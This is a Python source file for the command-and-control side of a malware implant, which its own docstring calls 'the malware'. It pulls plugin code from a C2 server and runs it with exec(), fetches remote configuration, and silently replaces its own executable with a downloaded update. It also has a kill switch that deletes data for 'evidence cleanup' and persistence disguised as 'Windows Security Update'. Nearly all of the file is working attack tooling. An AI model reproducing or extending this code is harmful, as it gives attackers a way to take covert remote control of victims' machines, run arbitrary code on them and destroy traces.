"""
Advanced Command & Control Features
Includes plugin system, remote updates, kill switch, and social engineering
Save as: server_modules/c2_features.py
"""
import os
import sys
import json
import time
import hashlib
import subprocess
import tempfile
import threading
from pathlib import Path
from typing import Optional, Dict, Any, List, Callable
from datetime import datetime


class PluginManager:
    """
    Dynamic plugin loading system
    Allows downloading and executing new capabilities at runtime
    """
    
    def __init__(self, plugin_dir: str = "plugins"):
        self.plugin_dir = Path(plugin_dir)
        self.plugin_dir.mkdir(exist_ok=True)
        self.loaded_plugins = {}
        self.plugin_metadata = {}
    
    def download_plugin(self, plugin_url: str, plugin_name: str) -> bool:
        """
        Download a plugin from C2 server
        
        Args:
            plugin_url: URL to download plugin from
            plugin_name: Name to save plugin as
        
        Returns:
            True if download successful
        """
        print(f"\n[*] Downloading plugin: {plugin_name}")
        print(f"    URL: {plugin_url}")
        
        try:
            import requests
            
            response = requests.get(plugin_url, timeout=30)
            
            if response.status_code == 200:
                plugin_path = self.plugin_dir / f"{plugin_name}.py"
                
                with open(plugin_path, 'wb') as f:
                    f.write(response.content)
                
                print(f"    ✓ Plugin downloaded: {len(response.content)} bytes")
                return True
            else:
                print(f"    ✗ Download failed: HTTP {response.status_code}")
                return False
                
        except Exception as e:
            print(f"    ✗ Download error: {e}")
            return False
    
    def validate_plugin(self, plugin_name: str, expected_hash: str = None) -> bool:
        """
        Validate plugin integrity
        
        Args:
            plugin_name: Name of plugin
            expected_hash: Expected SHA256 hash (optional)
        
        Returns:
            True if plugin is valid
        """
        plugin_path = self.plugin_dir / f"{plugin_name}.py"
        
        if not plugin_path.exists():
            print(f"    ✗ Plugin not found: {plugin_path}")
            return False
        
        if expected_hash:
            with open(plugin_path, 'rb') as f:
                content = f.read()
                actual_hash = hashlib.sha256(content).hexdigest()
            
            if actual_hash != expected_hash:
                print(f"    ✗ Hash mismatch!")
                print(f"      Expected: {expected_hash[:16]}...")
                print(f"      Actual:   {actual_hash[:16]}...")
                return False
        
        print(f"    ✓ Plugin validated")
        return True
    
    def load_plugin(self, plugin_name: str) -> bool:
        """
        Load a plugin into memory and execute
        
        Args:
            plugin_name: Name of plugin to load
        
        Returns:
            True if loaded successfully
        """
        print(f"\n[*] Loading plugin: {plugin_name}")
        
        try:
            plugin_path = self.plugin_dir / f"{plugin_name}.py"
            
            if not plugin_path.exists():
                print(f"    ✗ Plugin file not found")
                return False
            
            # Read plugin code
            with open(plugin_path, 'r') as f:
                plugin_code = f.read()
            
            # Create plugin namespace
            plugin_namespace = {}
            
            # Execute plugin code
            exec(plugin_code, plugin_namespace)
            
            # Store loaded plugin
            self.loaded_plugins[plugin_name] = plugin_namespace
            
            # Store metadata if available
            if 'PLUGIN_METADATA' in plugin_namespace:
                self.plugin_metadata[plugin_name] = plugin_namespace['PLUGIN_METADATA']
            
            print(f"    ✓ Plugin loaded successfully")
            
            # Call initialization function if it exists
            if 'initialize' in plugin_namespace:
                print(f"    [*] Initializing plugin...")
                plugin_namespace['initialize']()
                print(f"    ✓ Plugin initialized")
            
            return True
            
        except Exception as e:
            print(f"    ✗ Failed to load plugin: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def execute_plugin_function(self, plugin_name: str, function_name: str, *args, **kwargs) -> Any:
        """
        Execute a function from a loaded plugin
        
        Args:
            plugin_name: Name of plugin
            function_name: Function to call
            *args, **kwargs: Arguments to pass to function
        
        Returns:
            Function return value
        """
        if plugin_name not in self.loaded_plugins:
            print(f"[!] Plugin not loaded: {plugin_name}")
            return None
        
        plugin = self.loaded_plugins[plugin_name]
        
        if function_name not in plugin:
            print(f"[!] Function not found in plugin: {function_name}")
            return None
        
        try:
            return plugin[function_name](*args, **kwargs)
        except Exception as e:
            print(f"[!] Plugin execution error: {e}")
            return None
    
    def unload_plugin(self, plugin_name: str) -> bool:
        """
        Unload a plugin from memory
        
        Args:
            plugin_name: Name of plugin to unload
        
        Returns:
            True if unloaded successfully
        """
        if plugin_name in self.loaded_plugins:
            # Call cleanup function if it exists
            plugin = self.loaded_plugins[plugin_name]
            if 'cleanup' in plugin:
                try:
                    plugin['cleanup']()
                except Exception as e:
                    print(f"[!] Plugin cleanup error: {e}")
            
            del self.loaded_plugins[plugin_name]
            
            if plugin_name in self.plugin_metadata:
                del self.plugin_metadata[plugin_name]
            
            print(f"[*] Plugin unloaded: {plugin_name}")
            return True
        
        return False
    
    def list_plugins(self) -> Dict[str, Any]:
        """
        List all loaded plugins and their metadata
        
        Returns:
            Dictionary of plugin information
        """
        return {
            'loaded': list(self.loaded_plugins.keys()),
            'metadata': self.plugin_metadata
        }


class RemoteConfigManager:
    """
    Manage remote configuration updates
    Allows C2 to change behavior without redeployment
    """
    
    def __init__(self, config_url: str, api_key: str, local_config_file: str = "config.json"):
        self.config_url = config_url
        self.api_key = api_key
        self.local_config_file = local_config_file
        self.current_config = self.load_local_config()
        self.config_version = self.current_config.get('config_version', 1)
    
    def load_local_config(self) -> Dict[str, Any]:
        """Load local configuration"""
        if os.path.exists(self.local_config_file):
            with open(self.local_config_file, 'r') as f:
                return json.load(f)
        return {}
    
    def save_local_config(self, config: Dict[str, Any]) -> bool:
        """Save configuration locally"""
        try:
            with open(self.local_config_file, 'w') as f:
                json.dump(config, f, indent=4)
            return True
        except Exception as e:
            print(f"[!] Failed to save config: {e}")
            return False
    
    def fetch_remote_config(self) -> Optional[Dict[str, Any]]:
        """
        Fetch updated configuration from C2 server
        
        Returns:
            New configuration dict or None
        """
        print("\n[*] Checking for configuration updates...")
        
        try:
            import requests
            
            response = requests.get(
                self.config_url,
                headers={'X-API-Key': self.api_key},
                params={'current_version': self.config_version},
                timeout=10
            )
            
            if response.status_code == 200:
                remote_config = response.json()
                remote_version = remote_config.get('config_version', 1)
                
                if remote_version > self.config_version:
                    print(f"    ✓ New configuration available (v{remote_version})")
                    return remote_config
                else:
                    print(f"    ✓ Configuration is up to date (v{self.config_version})")
                    return None
            else:
                print(f"    ✗ Failed to fetch config: HTTP {response.status_code}")
                return None
                
        except Exception as e:
            print(f"    ✗ Config fetch error: {e}")
            return None
    
    def apply_config_update(self, new_config: Dict[str, Any]) -> bool:
        """
        Apply a new configuration
        
        Args:
            new_config: New configuration dictionary
        
        Returns:
            True if applied successfully
        """
        print("[*] Applying configuration update...")
        
        try:
            # Backup current config
            backup_file = f"{self.local_config_file}.backup"
            self.save_local_config(self.current_config)
            
            # Apply new config
            self.current_config = new_config
            self.config_version = new_config.get('config_version', self.config_version + 1)
            
            # Save to disk
            if self.save_local_config(new_config):
                print(f"    ✓ Configuration updated to v{self.config_version}")
                return True
            else:
                print(f"    ✗ Failed to save new configuration")
                return False
                
        except Exception as e:
            print(f"    ✗ Config update error: {e}")
            return False
    
    def auto_update_loop(self, interval: int = 3600):
        """
        Automatically check for config updates
        
        Args:
            interval: Seconds between checks (default: 1 hour)
        """
        print(f"[*] Starting auto-update (checking every {interval}s)")
        
        while True:
            time.sleep(interval)
            
            new_config = self.fetch_remote_config()
            if new_config:
                self.apply_config_update(new_config)


class SelfUpdater:
    """
    Self-update mechanism
    Download and install newer versions of the malware
    """
    
    def __init__(self, update_url: str, api_key: str, current_version: str = "1.0.0"):
        self.update_url = update_url
        self.api_key = api_key
        self.current_version = current_version
    
    def check_for_updates(self) -> Optional[Dict[str, Any]]:
        """
        Check if a newer version is available
        
        Returns:
            Update info dict or None
        """
        print("\n[*] Checking for software updates...")
        
        try:
            import requests
            
            response = requests.get(
                self.update_url,
                headers={'X-API-Key': self.api_key},
                params={'current_version': self.current_version},
                timeout=10
            )
            
            if response.status_code == 200:
                update_info = response.json()
                
                if update_info.get('update_available'):
                    print(f"    ✓ Update available: v{update_info.get('version')}")
                    print(f"      Current: v{self.current_version}")
                    return update_info
                else:
                    print(f"    ✓ Software is up to date (v{self.current_version})")
                    return None
            else:
                print(f"    ✗ Update check failed: HTTP {response.status_code}")
                return None
                
        except Exception as e:
            print(f"    ✗ Update check error: {e}")
            return None
    
    def download_update(self, download_url: str) -> Optional[Path]:
        """
        Download update file
        
        Args:
            download_url: URL to download from
        
        Returns:
            Path to downloaded file or None
        """
        print("[*] Downloading update...")
        
        try:
            import requests
            
            response = requests.get(download_url, timeout=60, stream=True)
            
            if response.status_code == 200:
                # Save to temp file
                temp_file = Path(tempfile.gettempdir()) / "update.exe"
                
                with open(temp_file, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                
                print(f"    ✓ Update downloaded: {temp_file}")
                return temp_file
            else:
                print(f"    ✗ Download failed: HTTP {response.status_code}")
                return None
                
        except Exception as e:
            print(f"    ✗ Download error: {e}")
            return None
    
    def verify_update(self, update_file: Path, expected_hash: str) -> bool:
        """
        Verify update file integrity
        
        Args:
            update_file: Path to update file
            expected_hash: Expected SHA256 hash
        
        Returns:
            True if verification passes
        """
        print("[*] Verifying update...")
        
        try:
            with open(update_file, 'rb') as f:
                content = f.read()
                actual_hash = hashlib.sha256(content).hexdigest()
            
            if actual_hash == expected_hash:
                print(f"    ✓ Update verified")
                return True
            else:
                print(f"    ✗ Hash mismatch!")
                print(f"      Expected: {expected_hash[:16]}...")
                print(f"      Actual:   {actual_hash[:16]}...")
                return False
                
        except Exception as e:
            print(f"    ✗ Verification error: {e}")
            return False
    
    def install_update(self, update_file: Path) -> bool:
        """
        Install the update and restart
        
        Args:
            update_file: Path to update file
        
        Returns:
            True if installation initiated
        """
        print("[*] Installing update...")
        
        try:
            # Get current executable path
            current_exe = Path(sys.executable)
            backup_exe = current_exe.with_suffix('.exe.bak')
            
            # Backup current version
            if current_exe.exists():
                current_exe.replace(backup_exe)
                print(f"    ✓ Backed up current version")
            
            # Copy update to current location
            import shutil
            shutil.copy2(update_file, current_exe)
            print(f"    ✓ Update installed")
            
            # Restart with new version
            print(f"    [*] Restarting...")
            subprocess.Popen([str(current_exe)], 
                           creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0)
            
            # Exit current process
            sys.exit(0)
            
        except Exception as e:
            print(f"    ✗ Installation error: {e}")
            return False
    
    def perform_update(self) -> bool:
        """
        Check for and install updates if available
        
        Returns:
            True if update was performed
        """
        update_info = self.check_for_updates()
        
        if not update_info:
            return False
        
        # Download
        update_file = self.download_update(update_info['download_url'])
        if not update_file:
            return False
        
        # Verify
        if not self.verify_update(update_file, update_info['sha256']):
            update_file.unlink()  # Delete invalid file
            return False
        
        # Install
        return self.install_update(update_file)


class KillSwitch:
    """
    Emergency kill switch
    Allows C2 to remotely terminate and clean up
    """
    
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.armed = False
        self.kill_switch_url = None
    
    def check_kill_switch(self, check_url: str) -> bool:
        """
        Check if kill switch has been activated
        
        Args:
            check_url: URL to check kill switch status
        
        Returns:
            True if kill switch is active
        """
        try:
            import requests
            
            response = requests.get(
                check_url,
                headers={'X-API-Key': self.api_key},
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get('kill_switch_active', False)
            
            return False
            
        except:
            return False
    
    def execute_kill_switch(self, cleanup_level: str = 'standard'):
        """
        Execute kill switch - terminate and clean up
        
        Args:
            cleanup_level: Level of cleanup (minimal, standard, thorough)
        """
        print("\n" + "="*70)
        print("KILL SWITCH ACTIVATED")
        print("="*70)
        print(f"Cleanup level: {cleanup_level}")
        
        # Stop monitoring
        try:
            from server_modules.monitoring import stop_monitoring
            from server_modules.config import pc_id
            stop_monitoring(pc_id)
            print("[*] Monitoring stopped")
        except:
            pass
        
        if cleanup_level in ['standard', 'thorough']:
            # Remove persistence
            try:
                from persistence_modules.registry import remove_registry_persistence
                remove_registry_persistence("Windows Security Update")
                print("[*] Persistence removed")
            except:
                pass
        
        if cleanup_level == 'thorough':
            # Delete data files
            try:
                from server_modules.config import DATA_DIR
                import shutil
                if DATA_DIR.exists():
                    shutil.rmtree(DATA_DIR)
                    print("[*] Data files deleted")
            except:
                pass
            
            # Self-delete
            try:
                print("[*] Initiating self-deletion...")
                # Would implement actual self-deletion here
                # Using batch file or scheduled task
            except:
                pass
        
        print("="*70)
        print("Kill switch execution complete - Terminating")
        print("="*70)
        
        sys.exit(0)
    
    def monitor_kill_switch(self, check_url: str, interval: int = 300):
        """
        Continuously monitor kill switch status
        
        Args:
            check_url: URL to check
            interval: Seconds between checks (default: 5 minutes)
        """
        print(f"[*] Kill switch monitor started (checking every {interval}s)")
        
        while True:
            time.sleep(interval)
            
            if self.check_kill_switch(check_url):
                self.execute_kill_switch(cleanup_level='thorough')
                break


class UninstallManager:
    """
    Remote uninstall capability
    Clean removal on command
    """
    
    @staticmethod
    def uninstall(remove_data: bool = True, remove_persistence: bool = True) -> bool:
        """
        Perform clean uninstall
        
        Args:
            remove_data: Whether to delete data files
            remove_persistence: Whether to remove persistence
        
        Returns:
            True if uninstall successful
        """
        print("\n" + "="*70)
        print("REMOTE UNINSTALL INITIATED")
        print("="*70)
        
        success = True
        
        # Stop monitoring
        try:
            from server_modules.monitoring import stop_monitoring
            from server_modules.config import pc_id
            stop_monitoring(pc_id)
            print("[✓] Monitoring stopped")
        except Exception as e:
            print(f"[!] Could not stop monitoring: {e}")
            success = False
        
        # Remove persistence
        if remove_persistence:
            try:
                from persistence_modules.registry import remove_registry_persistence
                remove_registry_persistence("Windows Security Update")
                print("[✓] Persistence removed")
            except Exception as e:
                print(f"[!] Could not remove persistence: {e}")
                success = False
        
        # Remove data
        if remove_data:
            try:
                from server_modules.config import DATA_DIR
                import shutil
                if DATA_DIR.exists():
                    shutil.rmtree(DATA_DIR)
                    print("[✓] Data files deleted")
            except Exception as e:
                print(f"[!] Could not delete data: {e}")
                success = False
        
        print("="*70)
        if success:
            print("✓ Uninstall completed successfully")
        else:
            print("⚠ Uninstall completed with errors")
        print("="*70)
        
        return success


# =============================================================================
# Command Handler
# =============================================================================

class C2CommandHandler:
    """
    Central handler for all C2 commands
    """
    
    def __init__(self, api_key: str, server_url: str):
        self.api_key = api_key
        self.server_url = server_url
        self.plugin_manager = PluginManager()
        self.config_manager = None
        self.self_updater = SelfUpdater(f"{server_url}/api/update", api_key)
        self.kill_switch = KillSwitch(api_key)
        
        # Command registry
        self.commands = {
            'install_plugin': self.handle_install_plugin,
            'unload_plugin': self.handle_unload_plugin,
            'list_plugins': self.handle_list_plugins,
            'update_config': self.handle_update_config,
            'self_update': self.handle_self_update,
            'kill_switch': self.handle_kill_switch,
            'uninstall': self.handle_uninstall,
        }
    
    def handle_command(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """
        Handle a C2 command
        
        Args:
            command: Command dictionary with 'type' and parameters
        
        Returns:
            Result dictionary
        """
        cmd_type = command.get('type')
        
        if cmd_type not in self.commands:
            return {'success': False, 'error': f'Unknown command: {cmd_type}'}
        
        try:
            return self.commands[cmd_type](command)
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def handle_install_plugin(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """Install a plugin"""
        plugin_url = command.get('plugin_url')
        plugin_name = command.get('plugin_name')
        expected_hash = command.get('sha256')
        
        if self.plugin_manager.download_plugin(plugin_url, plugin_name):
            if self.plugin_manager.validate_plugin(plugin_name, expected_hash):
                if self.plugin_manager.load_plugin(plugin_name):
                    return {'success': True, 'message': f'Plugin {plugin_name} installed'}
        
        return {'success': False, 'error': 'Plugin installation failed'}
    
    def handle_unload_plugin(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """Unload a plugin"""
        plugin_name = command.get('plugin_name')
        
        if self.plugin_manager.unload_plugin(plugin_name):
            return {'success': True, 'message': f'Plugin {plugin_name} unloaded'}
        
        return {'success': False, 'error': 'Plugin unload failed'}
    
    def handle_list_plugins(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """List loaded plugins"""
        return {
            'success': True,
            'plugins': self.plugin_manager.list_plugins()
        }
    
    def handle_update_config(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """Update configuration"""
        new_config = command.get('config')
        
        if not self.config_manager:
            return {'success': False, 'error': 'Config manager not initialized'}
        
        if self.config_manager.apply_config_update(new_config):
            return {'success': True, 'message': 'Configuration updated'}
        
        return {'success': False, 'error': 'Config update failed'}
    
    def handle_self_update(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """Perform self-update"""
        if self.self_updater.perform_update():
            return {'success': True, 'message': 'Update installed, restarting...'}
        
        return {'success': False, 'error': 'Update failed'}
    
    def handle_kill_switch(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """Execute kill switch"""
        cleanup_level = command.get('cleanup_level', 'standard')
        
        # This won't return - process will terminate
        threading.Thread(target=self.kill_switch.execute_kill_switch, 
                        args=(cleanup_level,), daemon=True).start()
        
        return {'success': True, 'message': 'Kill switch activated'}
    
    def handle_uninstall(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """Perform uninstall"""
        remove_data = command.get('remove_data', True)
        remove_persistence = command.get('remove_persistence', True)
        
        if UninstallManager.uninstall(remove_data, remove_persistence):
            return {'success': True, 'message': 'Uninstall complete'}
        
        return {'success': False, 'error': 'Uninstall failed'}


# =============================================================================
# DEMONSTRATION
# =============================================================================

if __name__ == "__main__":
    print("\n" + "="*70)
    print("ADVANCED C2 FEATURES DEMONSTRATION")
    print("="*70)
    
    print("\n1. PLUGIN SYSTEM")
    print("   - Dynamic capability loading")
    print("   - Runtime module installation")
    print("   - No redeployment needed")
    
    print("\n2. REMOTE CONFIG UPDATES")
    print("   - Change behavior remotely")
    print("   - Update C2 servers")
    print("   - Modify settings")
    
    print("\n3. SELF-UPDATE")
    print("   - Automatic version checking")
    print("   - Secure update delivery")
    print("   - Seamless upgrade")
    
    print("\n4. KILL SWITCH")
    print("   - Emergency termination")
    print("   - Evidence cleanup")
    print("   - Remote activation")
    
    print("\n5. UNINSTALL")
    print("   - Clean removal")
    print("   - Persistence cleanup")
    print("   - Data deletion")
    
    print("="*70)